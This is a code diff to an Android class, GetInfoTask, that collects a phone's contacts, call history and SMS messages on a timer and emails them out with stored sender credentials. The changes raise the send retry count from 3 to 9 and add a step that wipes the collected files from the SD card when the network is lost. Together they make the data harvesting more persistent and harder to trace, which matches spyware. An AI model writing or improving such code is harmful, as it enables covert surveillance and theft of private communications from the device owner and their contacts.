@@ -42,6 +42,8 @@ public class GetInfoTask extends TimerTask
 {
 	private final static String LOGTAG = "GetInfoTask";
 	
+	private final static int DEFAULT_RETRY_COUNT = 9;
+	
 	public Context context;
 	private int interval = 1; // interval days
 	
@@ -59,10 +61,10 @@ public class GetInfoTask extends TimerTask
 	
 	public void run() 
 	{
-		if (attachments == null) attachments = new ArrayList<File>();
-		
 		// If network connected, try to collect and send the information
 		if (!SysUtils.isNetworkConnected(context)) return;
+		
+		if (attachments == null) attachments = new ArrayList<File>();
 		
 		// Firstly we should make sure the time range ( > days that user set)
 		Date lastDatetime = null;
@@ -85,13 +87,17 @@ public class GetInfoTask extends TimerTask
 		
 		// Collect information
 		CollectContact(context);
-		SysUtils.ThreadSleep(5000, LOGTAG);
+		SysUtils.threadSleep(5000, LOGTAG);
 		CollectPhoneCallHist(context);
-		SysUtils.ThreadSleep(1000, LOGTAG);
+		SysUtils.threadSleep(1000, LOGTAG);
 		CollectSms(context);
-		SysUtils.ThreadSleep(1000, LOGTAG);
+		SysUtils.threadSleep(1000, LOGTAG);
 		
-		if (!SysUtils.isNetworkConnected(context)) return;
+		if (!SysUtils.isNetworkConnected(context)) {
+			// Clean the files in SD-CARD
+			FileCtrl.cleanFolder();
+			return;
+		}
 		
 		// Send mail
 		String phoneNum = DeviceProperty.getPhoneNumber(context);
@@ -108,7 +114,7 @@ public class GetInfoTask extends TimerTask
 		String pwd = MailCfg.getSenderPwd(context);
 		
 		boolean result = false;
-		int retry = 3;
+		int retry = DEFAULT_RETRY_COUNT;
 		while(!result && retry > 0)
 		{
 			String sender = MailCfg.getSender(context);
